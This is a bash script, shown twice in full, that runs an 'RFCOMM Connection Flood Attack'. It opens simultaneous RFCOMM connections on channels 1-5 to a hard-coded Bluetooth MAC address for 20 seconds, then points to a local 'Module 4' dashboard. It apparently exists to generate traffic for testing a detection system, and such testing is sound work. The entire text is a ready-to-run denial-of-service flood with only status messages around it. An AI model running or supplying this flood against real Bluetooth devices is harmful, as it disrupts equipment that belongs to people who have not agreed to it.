#!/bin/bash
################################################################################
# ATTACK 2: RFCOMM CONNECTION FLOOD
# Status: NEW - READY TO TEST
# Severity: HIGH
# Duration: 20 seconds
################################################################################

TARGET="28:C6:3F:91:67:CE"

echo "=========================================="
echo "🟠 RFCOMM Connection Flood Attack"
echo "=========================================="
echo "Target: $TARGET"
echo "Duration: 20 seconds"
echo "Channels: 1-5"
echo ""

for i in {1..5}; do
    timeout 20 rfcomm connect 0 $TARGET $i &>/dev/null &
    echo "  [+] Launched RFCOMM connection on channel $i"
done

echo ""
echo "✅ Attack launched! Running for 20 seconds..."
sleep 20

pkill -9 rfcomm
echo "✅ Attack completed!"
echo ""
echo "📱 Check Module 4: http://localhost:8000/module4"












################################################################################
# ATTACK 2: RFCOMM CONNECTION FLOOD
# Status: NEW - READY TO TEST
# Severity: HIGH
# Duration: 20 seconds
################################################################################

TARGET="28:C6:3F:91:67:CE"

echo "=========================================="
echo "🟠 RFCOMM Connection Flood Attack"
echo "=========================================="
echo "Target: $TARGET"
echo "Duration: 20 seconds"
echo "Channels: 1-5"
echo ""

for i in {1..5}; do
    timeout 20 rfcomm connect 0 $TARGET $i &>/dev/null &
    echo "  [+] Launched RFCOMM connection on channel $i"
done

echo ""
echo "✅ Attack launched! Running for 20 seconds..."
sleep 20

pkill -9 rfcomm
echo "✅ Attack completed!"
echo ""
echo "📱 Check Module 4: http://localhost:8000/module4"














